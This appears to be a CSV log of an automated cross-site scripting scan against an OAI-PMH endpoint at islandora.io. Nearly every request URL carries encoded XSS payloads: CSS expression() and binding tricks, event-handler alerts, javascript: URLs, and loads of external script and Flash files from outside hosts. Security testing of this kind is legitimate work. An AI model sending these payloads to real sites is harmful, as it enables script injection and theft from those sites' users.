uuid,timestamp,http_status_code,request_url,response_time,http_version
17a48832-bbbf-47b6-90df-813d7b1b240e,2025-01-28 09:39:08,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22binding%3A+url%28http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%29%3B%22%3E+%5BMozilla%5D,62.21 ms,HTTP/1.1
df2961dc-eeed-4af4-9fc4-c0acf80d5720,2025-01-28 09:39:08,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+style%3D%22binding%3A+url%28http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%29%3B%22%3E+%5BMozilla%5D,48.72 ms,HTTP/1.1
9deef409-e715-4190-a995-342870495c02,2025-01-28 09:39:09,200,http://islandora.io/oai/request?verb=ListSets,45.10 ms,HTTP/1.1
33fd9f07-c225-4126-81c1-5c42a2d10503,2025-01-28 09:39:09,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,49.77 ms,HTTP/1.1
ed667d1f-eb56-4c91-8f13-5cd0a35363b0,2025-01-28 09:39:09,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cdiv+style%3D%22binding%3A+url%28http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%29%3B%22%3E+%5BMozilla%5D&set=%3Cdiv+style%3D%22binding%3A+url%28http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%29%3B%22%3E+%5BMozilla%5D,94.05 ms,HTTP/1.1
12763dc1-7688-4788-a5cf-95de5c017673,2025-01-28 09:39:10,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22binding%3A+url%28http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%29%3B%22%3E+%5BMozilla%5D&metadataPrefix=oai_dc,57.52 ms,HTTP/1.1
45adc691-a46f-4f30-8784-251cbde7ac2a,2025-01-28 09:39:10,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3ELOL,100.91 ms,HTTP/1.1
0fc66d47-ec18-48f8-8968-c2fb8b15e9b3,2025-01-28 09:39:10,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3ELOL,55.89 ms,HTTP/1.1
ce5c9b3f-ae14-4d81-850c-3fb3af4a88ab,2025-01-28 09:39:11,200,http://islandora.io/oai/request?verb=ListSets,52.37 ms,HTTP/1.1
5f23d3fb-6c6c-46bb-91db-4407047e7ffc,2025-01-28 09:39:11,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,51.72 ms,HTTP/1.1
881b23e0-2602-4bba-9a97-3fa5347544b9,2025-01-28 09:39:11,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3ELOL&until=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3ELOL,43.21 ms,HTTP/1.1
0eabd436-8acb-476f-a9be-b1de696a79e2,2025-01-28 09:39:12,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3ELOL&metadataPrefix=marc,75.74 ms,HTTP/1.1
019f6a63-b199-43fa-8ab3-abedb8d460f6,2025-01-28 09:39:12,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EXXX,64.27 ms,HTTP/1.1
80dd9e99-f044-424a-a191-e807b54a53e7,2025-01-28 09:39:13,200,http://islandora.io/oai/request?verb=ListMetadataFormats,50.67 ms,HTTP/1.1
35d225d5-7351-45eb-96e8-4ba61542739b,2025-01-28 09:39:13,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EXXX,66.43 ms,HTTP/1.1
9b210c4e-b053-4b90-94dc-9741dc5404c7,2025-01-28 09:39:13,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EXXX,76.26 ms,HTTP/1.1
a8fb881f-a82e-48e1-9a17-af7f585ce2b2,2025-01-28 09:39:14,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EXXX,119.13 ms,HTTP/1.1
66d081d6-3ee7-44ac-abcf-3f1b9b65af5e,2025-01-28 09:39:14,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EXXX&metadataPrefix=oai_dc,50.70 ms,HTTP/1.1
2d5d1b04-bc0e-4ad7-b57f-ab7d1109b2c0,2025-01-28 09:39:14,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A%2F%2Ffoo.f%2Foo%7D%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX,60.20 ms,HTTP/1.1
1d10c791-c330-450a-9c4d-825f624408c9,2025-01-28 09:39:15,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A%2F%2Ffoo.f%2Foo%7D%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX,59.13 ms,HTTP/1.1
7c3dc678-b234-4266-887a-b1487efabae2,2025-01-28 09:39:15,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A%2F%2Ffoo.f%2Foo%7D%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX,62.55 ms,HTTP/1.1
59b8d79e-ff24-4ad0-a3d0-0579b0dd9e9c,2025-01-28 09:39:15,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv+style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A%2F%2Ffoo.f%2Foo%7D%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX&until=%3Cdiv+style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A%2F%2Ffoo.f%2Foo%7D%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX,56.85 ms,HTTP/1.1
5c7f469b-4068-44de-9adb-5f63555ed172,2025-01-28 09:39:16,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cdiv+style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A%2F%2Ffoo.f%2Foo%7D%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX,57.36 ms,HTTP/1.1
a3c08600-75c9-4fec-9013-ea36c3447904,2025-01-28 09:39:16,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A%2F%2Ffoo.f%2Foo%7D%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX&metadataPrefix=marc,67.66 ms,HTTP/1.1
50c2a6f3-82bb-49fd-82f5-0c3bfb9074b5,2025-01-28 09:39:16,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX,66.58 ms,HTTP/1.1
13ec607c-a3bb-4d38-b929-5f62dd41b373,2025-01-28 09:39:17,200,http://islandora.io/oai/request?verb=ListMetadataFormats,51.23 ms,HTTP/1.1
d2332c1c-74ea-4fa9-be2b-fff9a7484300,2025-01-28 09:39:17,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX,65.59 ms,HTTP/1.1
344d6f82-8c95-4f44-a14f-c9401b2657fc,2025-01-28 09:39:18,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Cdiv+style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX,51.92 ms,HTTP/1.1
1e583f70-96fa-4db6-918c-8828a9d1843e,2025-01-28 09:39:18,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cdiv+style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX,79.71 ms,HTTP/1.1
98f4d3f7-2735-4458-be8c-28b58a4f705a,2025-01-28 09:39:18,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX&metadataPrefix=marc,63.49 ms,HTTP/1.1
ebeb5e57-5e56-437e-911a-46dc166f18d1,2025-01-28 09:39:19,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX,65.55 ms,HTTP/1.1
6a48a889-6724-4800-8f9d-3bc47b74365d,2025-01-28 09:39:19,200,http://islandora.io/oai/request?verb=ListMetadataFormats,43.27 ms,HTTP/1.1
80b3df50-6d51-4826-993b-2e475e75d661,2025-01-28 09:39:19,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX,53.71 ms,HTTP/1.1
ef09f097-8bc4-48e6-806b-86f1d6dd157d,2025-01-28 09:39:20,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX&until=%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX,58.45 ms,HTTP/1.1
d75e871e-3171-4488-9e18-14e185d0d179,2025-01-28 09:39:20,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX,64.75 ms,HTTP/1.1
937bfb95-2d85-4fee-af85-989b7515b370,2025-01-28 09:39:20,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX&metadataPrefix=oai_dc,67.84 ms,HTTP/1.1
d132cb45-c9b3-49c5-9da9-cd5add1ec41f,2025-01-28 09:39:21,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,58.46 ms,HTTP/1.1
306dd1dc-7fcc-46fc-b37c-80f5c3b78fe7,2025-01-28 09:39:21,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,65.87 ms,HTTP/1.1
e625769e-a9b7-443b-bfa3-6e8d51c183a3,2025-01-28 09:39:21,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,68.17 ms,HTTP/1.1
7647a014-ce7f-4d74-b683-6e8166828565,2025-01-28 09:39:22,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E&until=%3Cdiv+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E&set=%3Cdiv+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,68.84 ms,HTTP/1.1
568a3cc5-7dda-4c1d-a62b-1576b5fe7c32,2025-01-28 09:39:22,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,41.88 ms,HTTP/1.1
2cde98cd-169d-4b6e-9482-6fc681df32b0,2025-01-28 09:39:22,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E&metadataPrefix=marc,59.93 ms,HTTP/1.1
ba36c112-8e04-4ce9-84c0-a0da372fe4b0,2025-01-28 09:39:23,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22width%3A+expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E,67.34 ms,HTTP/1.1
b2ce9bac-48ec-4fca-8c9f-2fac3e66a5c4,2025-01-28 09:39:23,200,http://islandora.io/oai/request?verb=ListMetadataFormats,41.68 ms,HTTP/1.1
73d1706a-378f-4f80-a162-874334e52948,2025-01-28 09:39:23,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22width%3A+expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E,54.34 ms,HTTP/1.1
debb6e12-08c9-4fa5-91d2-faf11440a840,2025-01-28 09:39:24,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3Cdiv+style%3D%22width%3A+expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E,65.75 ms,HTTP/1.1
19a168d4-84eb-4bd8-9a49-6a6fd785a780,2025-01-28 09:39:24,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cdiv+style%3D%22width%3A+expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E&set=%3Cdiv+style%3D%22width%3A+expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E,84.45 ms,HTTP/1.1
d0313021-28d4-49a7-82b1-b3c78c560b30,2025-01-28 09:39:25,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22width%3A+expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E&metadataPrefix=marc,63.66 ms,HTTP/1.1
3cac1edd-2ad0-4550-bd04-b6c34ff0a341,2025-01-28 09:39:25,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22x%3Aexpression%28%28window.r%3D%3D1%29%3F%27%27%3Aeval%28%27r%3D1%3B,74.05 ms,HTTP/1.1
4bb4a110-6bfc-4b9c-9f6c-08b317ca2e91,2025-01-28 09:39:25,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+style%3D%22x%3Aexpression%28%28window.r%3D%3D1%29%3F%27%27%3Aeval%28%27r%3D1%3B,49.97 ms,HTTP/1.1
3528c9bd-7c3e-4433-8bb0-a146126d6bf0,2025-01-28 09:39:26,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22x%3Aexpression%28%28window.r%3D%3D1%29%3F%27%27%3Aeval%28%27r%3D1%3B,70.68 ms,HTTP/1.1
e8f32baf-bb61-4421-ad0b-b3058d285ed0,2025-01-28 09:39:26,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,74.69 ms,HTTP/1.1
eb02b6c4-abc9-47f7-ac62-fa6579482998,2025-01-28 09:39:26,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cdiv+style%3D%22x%3Aexpression%28%28window.r%3D%3D1%29%3F%27%27%3Aeval%28%27r%3D1%3B,63.62 ms,HTTP/1.1
a9a54215-0f86-4dca-a000-7fc199361588,2025-01-28 09:39:27,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22x%3Aexpression%28%28window.r%3D%3D1%29%3F%27%27%3Aeval%28%27r%3D1%3B&metadataPrefix=marc,70.75 ms,HTTP/1.1
771627e1-82fd-4f03-b40b-3ec9428b191f,2025-01-28 09:39:27,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,59.21 ms,HTTP/1.1
1d0ebe41-5e49-49a8-b711-95d36bc2f485,2025-01-28 09:39:27,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,68.39 ms,HTTP/1.1
d0b2a8c8-be70-46ff-aed8-6d643524fb04,2025-01-28 09:39:28,200,http://islandora.io/oai/request?verb=ListSets,69.14 ms,HTTP/1.1
99210edd-98f6-4639-8a4f-c07799f4ac55,2025-01-28 09:39:28,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cdiv+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,105.94 ms,HTTP/1.1
5674186e-d532-42f8-b8b0-7df08c6f1fa9,2025-01-28 09:39:29,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cdiv+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E&until=%3Cdiv+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,44.25 ms,HTTP/1.1
f2217223-6479-4272-8e2e-a2ac14ad315d,2025-01-28 09:39:29,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E&metadataPrefix=marc,63.16 ms,HTTP/1.1
63b0c72f-56fd-47b0-a05d-f98b248039f7,2025-01-28 09:39:29,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C%2Fdiv%3E,51.13 ms,HTTP/1.1
ca945278-08ce-4f23-a9cb-0e2aeacb6bc4,2025-01-28 09:39:30,200,http://islandora.io/oai/request?verb=ListMetadataFormats,34.56 ms,HTTP/1.1
4b75813f-5580-455b-a25e-d58fb0892028,2025-01-28 09:39:30,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C%2Fdiv%3E,66.75 ms,HTTP/1.1
af04c9e7-ef90-4213-9e5f-501d2ab6d807,2025-01-28 09:39:30,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv+style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C%2Fdiv%3E&set=%3Cdiv+style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C%2Fdiv%3E,58.79 ms,HTTP/1.1
7aa6b300-591a-4dc4-ab04-b0f2fb4f32a2,2025-01-28 09:39:31,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cdiv+style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C%2Fdiv%3E&until=%3Cdiv+style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C%2Fdiv%3E,58.04 ms,HTTP/1.1
7a79c925-5126-47d8-9f02-aa9b92a57a90,2025-01-28 09:39:31,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C%2Fdiv%3E&metadataPrefix=oai_dc,85.44 ms,HTTP/1.1
945edeed-11dd-4fc0-9b27-de8a5fc91a2a,2025-01-28 09:39:31,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3Dwidth%3A1px%3Bfilter%3Aglow+onfilterchange%3Djavascript%3Aalert%281%29%3Ex,138.97 ms,HTTP/1.1
4d90960e-1fac-47a7-af32-9f6865fc3538,2025-01-28 09:39:32,200,http://islandora.io/oai/request?verb=ListMetadataFormats,52.12 ms,HTTP/1.1
95df52a7-0ca9-4f52-9e8e-29b0c86c1855,2025-01-28 09:39:32,200,http://islandora.io/oai/request?verb=ListSets,51.30 ms,HTTP/1.1
a0aa4e92-70cd-4b42-973f-559cd844e54a,2025-01-28 09:39:33,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Cdiv+style%3Dwidth%3A1px%3Bfilter%3Aglow+onfilterchange%3Djavascript%3Aalert%281%29%3Ex&set=%3Cdiv+style%3Dwidth%3A1px%3Bfilter%3Aglow+onfilterchange%3Djavascript%3Aalert%281%29%3Ex,66.03 ms,HTTP/1.1
5175f808-f39f-411f-bb36-795798232f26,2025-01-28 09:39:33,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cdiv+style%3Dwidth%3A1px%3Bfilter%3Aglow+onfilterchange%3Djavascript%3Aalert%281%29%3Ex&until=%3Cdiv+style%3Dwidth%3A1px%3Bfilter%3Aglow+onfilterchange%3Djavascript%3Aalert%281%29%3Ex,60.89 ms,HTTP/1.1
3a849bdc-a8dd-424e-aba2-52df0954ba28,2025-01-28 09:39:33,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3Dwidth%3A1px%3Bfilter%3Aglow+onfilterchange%3Djavascript%3Aalert%281%29%3Ex&metadataPrefix=oai_dc,69.55 ms,HTTP/1.1
a81dec5d-ff24-4bb8-88f0-30256b4426f7,2025-01-28 09:39:34,200,http://islandora.io/oai/request?verb=%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3E+style%3D%22x%3A%22%3E,67.17 ms,HTTP/1.1
35aa013b-47e7-46f6-9e6d-d10697b9815f,2025-01-28 09:39:34,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3E+style%3D%22x%3A%22%3E,57.43 ms,HTTP/1.1
df12bef5-cd02-40cb-84a9-098a59fa851d,2025-01-28 09:39:34,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3E+style%3D%22x%3A%22%3E,62.62 ms,HTTP/1.1
075e41d3-6b60-4ea3-9fe9-0e2065bf7b43,2025-01-28 09:39:35,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3E+style%3D%22x%3A%22%3E,58.87 ms,HTTP/1.1
62796289-afe0-46c1-93a4-65661ee1197d,2025-01-28 09:39:35,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3E+style%3D%22x%3A%22%3E,139.99 ms,HTTP/1.1
010664e1-110d-4092-ae89-4711b157a693,2025-01-28 09:39:35,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3E+style%3D%22x%3A%22%3E&metadataPrefix=oai_dc,46.32 ms,HTTP/1.1
eed6fbe4-5d54-4059-bb7d-e1dc16e957d9,2025-01-28 09:39:36,200,http://islandora.io/oai/request?verb=%3Cdiv%2Fstyle%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C%2Fdiv%3E+%7BIE7%7D,34.01 ms,HTTP/1.1
84caa497-5e66-4c9b-a8b9-12fdebc8c5ae,2025-01-28 09:39:36,200,http://islandora.io/oai/request?verb=ListMetadataFormats,48.27 ms,HTTP/1.1
67cc5e00-e10f-4a10-b9de-25397b5cddd5,2025-01-28 09:39:36,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv%2Fstyle%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C%2Fdiv%3E+%7BIE7%7D,67.49 ms,HTTP/1.1
9dd551d0-b197-4f2a-aca6-13eeed822e6d,2025-01-28 09:39:37,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv%2Fstyle%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C%2Fdiv%3E+%7BIE7%7D&set=%3Cdiv%2Fstyle%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C%2Fdiv%3E+%7BIE7%7D,71.61 ms,HTTP/1.1
fb068d68-c11a-4aa5-8e19-e260b0553055,2025-01-28 09:39:37,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cdiv%2Fstyle%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C%2Fdiv%3E+%7BIE7%7D,61.96 ms,HTTP/1.1
48e19ff4-b7fa-4556-a511-240cfa45125b,2025-01-28 09:39:38,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv%2Fstyle%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C%2Fdiv%3E+%7BIE7%7D&metadataPrefix=marc,59.44 ms,HTTP/1.1
573781e2-322c-4051-a2b7-f5dd3e82a2c2,2025-01-28 09:39:38,200,http://islandora.io/oai/request?verb=%3Cembed+code%3D%22http%3A%2F%2Fbusinessinfo.co.uk%2Flabs%2Fxss%2Fxss.swf%22+allowscriptaccess%3Dalways%3E,71.96 ms,HTTP/1.1
96dbdbf5-de16-4489-b112-92cc8142517e,2025-01-28 09:39:38,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.14 ms,HTTP/1.1
